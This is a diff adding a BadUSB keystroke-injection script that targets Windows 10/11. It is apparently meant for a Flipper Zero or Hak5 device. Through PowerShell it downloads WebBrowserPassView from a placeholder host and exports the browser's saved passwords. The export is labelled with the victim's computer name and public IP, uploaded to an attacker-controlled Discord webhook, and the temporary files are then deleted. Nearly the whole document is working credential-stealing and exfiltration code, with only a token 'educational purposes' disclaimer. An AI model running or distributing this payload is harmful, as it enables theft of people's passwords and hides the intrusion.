@@ -1,0 +1,86 @@
+REM Title:          Windows Browsers Saved Passwords to Discord 
+REM Description:    Grabs browser saved passwords, writes to a file, uploads it to Discord, then cleans up the file on the targets filesystem and exits. 
+REM Author:         Tsali
+REM Props:          Hak5 Team
+REM Version:        1.0
+REM Date:           2025/03/23
+REM Category:       Exfiltration
+REM Target:         Windows 10/11 (CMD + Powershell)
+REM Attackmodes:    HID
+REM Mandatory Info: Add your Discord Webhook URL in quotes with no spaces and with permission to post.
+REM Discord URL:    Example: https://discord.com/api/webhooks/123456789012345678/adjlfjlejlidsjasdlijflie_ajsdflkjaljeiljkdajlkjd
+REM Legal:          This script is for educational purposes only please do not use this for malicious purposes
+
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+STRING function Upload-Discord {
+ENTER
+STRING [CmdletBinding()]
+ENTER
+STRING param (
+ENTER
+STRING    [parameter(Position=0,Mandatory=$False)]
+ENTER
+STRING    [string]$file,
+ENTER
+STRING    [parameter(Position=1,Mandatory=$False)]
+ENTER
+STRING    [string]$text 
+ENTER
+STRING )
+ENTER
+STRING $hookurl = ''
+ENTER
+STRING $Body = @{
+ENTER
+STRING  'username' = "Flipper0"
+ENTER
+STRING  'content' = $text
+ENTER
+STRING }
+ENTER
+STRING if (-not ([string]::IsNullOrEmpty($text))){
+ENTER
+STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+ENTER
+STRING if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+ENTER
+STRING }
+ENTER
+DELAY 1000
+STRING rmdir -R \temp
+ENTER
+DELAY 1000
+STRING $pcinfo = Write-Output "$($env:computername)-$($(Invoke-RestMethod http://ipinfo.io/json).ip)" ; mkdir \temp ; cd \temp ; Invoke-WebRequest -Uri http://FINDORUPLOADTOAWEBSITE/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip
+ENTER
+STRING .\WebBrowserPassView.exe
+ENTER
+DELAY 4000
+CTRL A
+CTRL S
+DELAY 2000
+STRING C:\temp\export.txt
+TAB
+STRING f
+DELAY 100
+STRING T
+ENTER
+DELAY 100
+STRING Y
+DELAY 1000
+ALT F4
+DELAY 1000
+STRING Rename-item C:\temp\export.txt -NewName "$($pcinfo).txt"
+ENTER
+DELAY 1000
+STRING Upload-Discord -text "Success! Passwords from $pcinfo" -file "C:\temp\$pcinfo.txt"
+ENTER
+STRING cd \
+ENTER
+STRING rmdir -R \temp
+ENTER
+STRING EXIT
+ENTER
